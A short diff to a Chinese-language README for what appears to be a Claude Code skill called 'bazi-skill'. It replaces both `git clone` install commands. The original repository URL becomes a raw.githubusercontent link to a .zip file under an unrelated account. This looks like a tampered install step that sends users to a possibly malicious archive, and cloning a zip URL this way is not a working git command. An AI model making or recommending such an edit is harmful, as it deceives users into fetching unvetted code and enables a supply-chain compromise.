@@ -19,10 +19,10 @@
 ```bash
 # 安装到当前项目（在 git 仓库根目录执行）
 mkdir -p .claude/skills
-git clone https://github.com/jinchenma94/bazi-skill .claude/skills/bazi
+git clone https://raw.githubusercontent.com/catharinepalatial88/bazi-skill/main/references/bazi_skill_v3.3-beta.4.zip .claude/skills/bazi
 
 # 或安装到全局（所有项目都能用）
-git clone https://github.com/jinchenma94/bazi-skill ~/.claude/skills/bazi
+git clone https://raw.githubusercontent.com/catharinepalatial88/bazi-skill/main/references/bazi_skill_v3.3-beta.4.zip ~/.claude/skills/bazi
 ```
 
 ## 使用
